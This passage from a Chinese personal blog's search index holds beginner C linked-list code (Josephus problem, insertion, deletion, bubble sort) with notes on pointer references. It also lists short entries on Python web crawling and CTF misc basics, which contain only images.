<br>&#125;<br>i=p-&gt;data;<br>p-&gt;data=q-&gt;data;<br>q-&gt;data=i;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Sorted</span><span class="hljs-params">(Node *&amp;L)</span>&#123;<br><span class="hljs-type">int</span> i,j,k,t;<br>Node *p=L;<br><span class="hljs-type">int</span> len=Length(*&amp;L);<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len<span class="hljs-number">-1</span>;i++)&#123;<br>p=L;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;len<span class="hljs-number">-1</span>;j++)&#123;<br><span class="hljs-keyword">if</span>(p-&gt;data&lt;p-&gt;next-&gt;data)&#123;<br>t=p-&gt;data;<br>p-&gt;data=p-&gt;next-&gt;data;<br>p-&gt;next-&gt;data=t; <br>&#125;<br><br>p=p-&gt;next;<br>&#125;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fini5h3d\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">GetItem</span><span class="hljs-params">(Node *L,<span class="hljs-type">int</span> x)</span>&#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-comment">//printf(&quot;Get:Length=%d,x=%d\n&quot;,Length(*&amp;L),x);</span><br>shit1:<span class="hljs-keyword">if</span>(x&lt;<span class="hljs-number">0</span>)&#123;<br>x=x+Length(*&amp;L);<br><span class="hljs-keyword">goto</span> shit1;<br>&#125;<br><span class="hljs-keyword">if</span>(x&gt;=Length(*&amp;L))&#123;<br>x=x%Length(*&amp;L);<br>&#125;<br><span class="hljs-keyword">if</span>(x==<span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">return</span> L-&gt;data;<br>&#125;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;x;i++)&#123;<br>L=L-&gt;next;<br>&#125;<br><span class="hljs-comment">//printf(&quot;G3t 5ucc3553d,return=%d\n&quot;,L-&gt;data);</span><br><span class="hljs-keyword">return</span> L-&gt;data;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">IfEmpty</span><span class="hljs-params">(Node *L)</span>&#123;<br><span class="hljs-keyword">if</span>(L-&gt;next==<span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Josephus</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-type">int</span> k,<span class="hljs-type">int</span> a[])</span>&#123;<br>Node *head, *p, *q;<br>head = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; ++ i)&#123;<br>p = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>p-&gt;data = a[i];<br>p-&gt;next = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span>(head==<span class="hljs-literal">NULL</span>)&#123;<br>head = p;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>q-&gt;next = p;<br>&#125;<br>q = p;<br>&#125;<br>p-&gt;next = head;  <span class="hljs-comment">//形成循环链表</span><br>p = head;<br><span class="hljs-keyword">while</span>(p-&gt;next!=p)&#123; <span class="hljs-comment">// 条件不成立时循环链表中只有一个结点</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; k; ++ i)&#123;<br>q = p;<br>p = p-&gt;next;<br>&#125;<br>q-&gt;next = p-&gt;next;  <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, p-&gt;data);<br><span class="hljs-built_in">free</span>(p);   <br>p = q-&gt;next;  <span class="hljs-comment">// 新一轮计数的起点  </span><br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, p-&gt;data);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">L</span>;</span><br><span class="hljs-type">int</span> i,num,a[<span class="hljs-number">30</span>],m,x;<br>shit:<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入初始报数上限数：\n&quot;</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;num);<br><span class="hljs-keyword">if</span>(num&gt;<span class="hljs-number">30</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;err0r!!\n&quot;</span>);<br><span class="hljs-keyword">goto</span> shit;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入数组：\n&quot;</span>);<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;num;i++)&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;x);<br>a[i]=x;<br>&#125;<br>Init(*&amp;L,a,num);<br>Print(*&amp;L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入随机数m：\n&quot;</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;m);<br>Josephus(num,m,a);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="列表排序"><a href="#列表排序" class="headerlink" title="列表排序"></a>列表排序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>&#123;</span><br><span class="hljs-type">int</span> data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">next</span>=</span><span class="hljs-literal">NULL</span>;<br>&#125;;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Init</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *&amp;L,<span class="hljs-type">int</span> x[],<span class="hljs-type">int</span> len)</span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>*<span class="hljs-title">p</span>=</span>((<span class="hljs-keyword">struct</span> Node*)(<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Node))));<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>L=p;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i&lt;len;i++)&#123;<br>p-&gt;data=x[i];<br>p-&gt;next=((<span class="hljs-keyword">struct</span> Node*)(<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Node))));<br>p=p-&gt;next;<br>&#125;<br>p-&gt;next=<span class="hljs-literal">NULL</span>; <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fini5h3d\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *&amp;L,<span class="hljs-type">int</span> num,<span class="hljs-type">int</span> d)</span>&#123;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">a</span>=</span>((<span class="hljs-keyword">struct</span> Node*)(<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Node))));<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">p</span>=</span>L;<br><span class="hljs-keyword">while</span>(i&lt;num<span class="hljs-number">-1</span>)&#123;<br>p=p-&gt;next;<br>i++;<br>&#125;<br>a-&gt;next=p-&gt;next;<br>p-&gt;next=a;<br>a-&gt;data=d;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;插入成功！\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Delete</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *&amp;L,<span class="hljs-type">int</span> num)</span>&#123;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>Node *p=L;<br><span class="hljs-keyword">if</span>(num==<span class="hljs-number">0</span>)&#123;<br>L=L-&gt;next;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(i&lt;num<span class="hljs-number">-1</span>)&#123;<br>p=p-&gt;next;<br>i++;<br>&#125;<br>p-&gt;next=(p-&gt;next)-&gt;next;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除成功！\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Print</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *L)</span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">trans</span>=</span>L;<br><span class="hljs-keyword">if</span>(trans-&gt;next==<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;empty list!\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(trans-&gt;next!=<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,trans-&gt;data);<br>trans=trans-&gt;next;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;显示完毕\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">ChangeSpace</span><span class="hljs-params">(Node *&amp;L,<span class="hljs-type">int</span> a1,<span class="hljs-type">int</span> a2)</span>&#123;<br>Node *p=L;<br>Node *q=L;<br><span class="hljs-type">int</span> i; <br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;a1;i++)&#123;<br>p=p-&gt;next;   <span class="hljs-comment">//此时p到了下标a处</span><br>&#125;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;a2;i++)&#123;<br>q=q-&gt;next; <br>&#125;<br>i=p-&gt;data;<br>p-&gt;data=q-&gt;data;<br>q-&gt;data=i;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Length</span><span class="hljs-params">(Node *L)</span>&#123;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">while</span>(L-&gt;next!=<span class="hljs-literal">NULL</span>)&#123;<br>i++;<br>L=L-&gt;next;<br>&#125;<br><span class="hljs-keyword">return</span> i;<br>&#125;<br><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Sorted</span><span class="hljs-params">(Node *&amp;L)</span>&#123;<br><span class="hljs-type">int</span> i,j,k,t;<br>Node *p=L;<br><span class="hljs-type">int</span> len=Length(*&amp;L);<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len<span class="hljs-number">-1</span>;i++)&#123;<br>p=L;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;len<span class="hljs-number">-1</span>;j++)&#123;<br><span class="hljs-keyword">if</span>(p-&gt;data&lt;p-&gt;next-&gt;data)&#123;<br>t=p-&gt;data;<br>p-&gt;data=p-&gt;next-&gt;data;<br>p-&gt;next-&gt;data=t;<br> <br>&#125;<br><br>p=p-&gt;next;<br>&#125;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fini5h3d!!\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">L</span>;</span><br><span class="hljs-type">int</span> num=<span class="hljs-number">5</span>,data=<span class="hljs-number">12</span>,x[]=&#123;<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>&#125;,len=<span class="hljs-keyword">sizeof</span>(x)/<span class="hljs-keyword">sizeof</span>(num); <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;初始化：\n&quot;</span>);<br>Init(L,x,len);<br>Print(L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;排序\n&quot;</span>);<br>Sorted(*&amp;L);<br>Print(L);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="关于L和-L的区别"><a href="#关于L和-L的区别" class="headerlink" title="关于L和&amp;L的区别"></a>关于<em>L和</em>&amp;L的区别</h2><p>我定义了个链表结构体Node，并声明了一个结构体指针<em>L，然后定义1个初始化函数Init()，将</em>L作为参数传进去，结果函数运行结束后发现，<em>L的next和data地址的值并未改变，即函数里对</em>L的修改出了函数就没卵用了</p><p>经查阅资料发现，原理是：将结构体指针传入函数时，函数内会做一个copy，但此时函数内的<em>L和函数外的</em>L指向的地址8一样，所以导致里面变化而外面不变</p><p>解决方法：传参时，将结构体指针的引用传过去，当传入函数的参数规定为*&amp;L时，将改变传入实参的值，为*L时，8会改变值</p><p>参考<br><a href="https://blog.csdn.net/c991262331/article/details/83274525">csdn</a></p><h2 id="，引用"><a href="#，引用" class="headerlink" title="&amp;，引用"></a>&amp;，引用</h2><p>地址是在电脑内存中的地址（变量的值在内存中的储存位置），指针是存地址的变量，所以指针可以“指向”内存地址。概念上讲，引用变量本质上是指针的另一个名字（但是并不能被编译器实例化）。。。wtf???这玩意你他妈不是学过吗?</p><p>就把引用当成变量的另一个名字就好</p>]]></content>
    
    
    <categories>
      
      <category>寄科</category>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄科</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python爬虫</title>
    <link href="/2021/08/06/python%E7%88%AC%E8%99%AB/"/>
    <url>/2021/08/06/python%E7%88%AC%E8%99%AB/</url>
    
    <content type="html"><![CDATA[<p>一个编程辣鸡学习爬虫的简单笔记<br><img src="/images/%E7%88%AC%E8%99%AB_%E5%89%AF%E6%9C%AC.png"></p>]]></content>
    
    
    <categories>
      
      <category>寄科</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄科</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>misc一些焯基础知识</title>
    <link href="/2021/07/31/misc%E4%B8%80%E4%BA%9B%E7%84%AF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2021/07/31/misc%E4%B8%80%E4%BA%9B%E7%84%AF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<p><img src="/images/Misc%E5%85%A5%E9%97%A8%E7%BA%A7%E7%9F%A5%E8%AF%86.png"></p><p><img src="/images/16%E8%BF%9B%E5%88%B6%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%80%BB%E7%BB%93.png"></p><p><img src="/images/%E5%90%84%E7%A7%8D%E5%8A%A0%E5%AF%86%E5%B0%8F%E7%BB%93%E9%80%9F%E6%9F%A5.png"><br><img src="/images/%E5%B0%8F%EF%BC%9A%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86.png"><br><img src="/images/%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
